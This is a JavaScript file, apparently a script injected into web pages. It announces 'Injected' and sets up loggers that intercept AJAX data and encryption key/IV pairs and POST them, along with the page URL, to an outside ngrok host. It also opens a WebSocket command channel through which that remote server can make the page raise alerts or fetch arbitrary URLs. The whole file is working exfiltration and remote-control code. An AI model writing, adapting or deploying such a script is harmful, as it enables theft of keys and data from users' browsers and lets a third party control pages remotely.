alert("Injected ^_^")
window.keys = {}
window.rip_configs = {
  ajax_logger: "/api/ajax-logger",
  keys_logger: "/api/keys-logger",
  host: "https://eel-moral-ape.ngrok-free.app",
}

async function load_segment(url) {
  try {
    const response = await fetch(url)
    alert(`Status: ${response.status}, statusText: ${response.statusText}`)
  } catch (error) {}
}

function socketServer() {
  if (typeof WebSocket !== "undefined" && window.rip_configs) {
    const socket = new WebSocket(`wss://${new URL(window.rip_configs.host).host}/ws`)

    socket.addEventListener("message", (event) => {
      const { action, payload } = JSON.parse(event.data)

      if (action === "alert") alert(payload)
      if (action === "load_segment") load_segment(payload)
    })

    socket.addEventListener("open", (event) => {
      window.socket = socket
      socket.send(JSON.stringify({ action: "ping" }))
    })

    socket.addEventListener("error", (event) => {
      alert(`Xảy ra lỗi khi kết nối tới máy chủ`)
    })
  }
}

window.logger_callback = async (url, data_logger, show_alert = false) => {
  if (typeof fetch !== "undefined") {
    try {
      const response = await fetch(url, {
        method: "POST",
        body: JSON.stringify(data_logger),
        headers: {
          "Content-Type": "application/json",
          "X-Inject-Url": window.location.href,
        },
      })

      if (show_alert) {
        const data = await response.json()
        data.message && alert(data.message)
      }
    } catch (error) {
      show_alert && alert(error.message)
    }
  }
}

window.ajax_logger = function (data) {
  const { host, ajax_logger } = window.rip_configs || {}
  if (host && ajax_logger) window.logger_callback(host + ajax_logger, data, true)
}

window.key_logger = function (data) {
  const { host, keys_logger, key_logger } = window.rip_configs || {}

  if (data.key && data.iv && host) {
    window.keys[data.key] = data.iv

    if (window.key_logger_timeout) {
      clearTimeout(window.key_logger_timeout)
      window.key_logger_timeout = null
    }

    window.key_logger_timeout = setTimeout(async () => {
      await window.logger_callback(host + keys_logger, { fid: window.fid, keys: window.keys }, true)
      if (window.socket) window.socket.send(JSON.stringify({ action: "start", payload: window.fid }))
    }, 3000)
  }

  if (host && key_logger) window.logger_callback(host + key_logger, data)
}
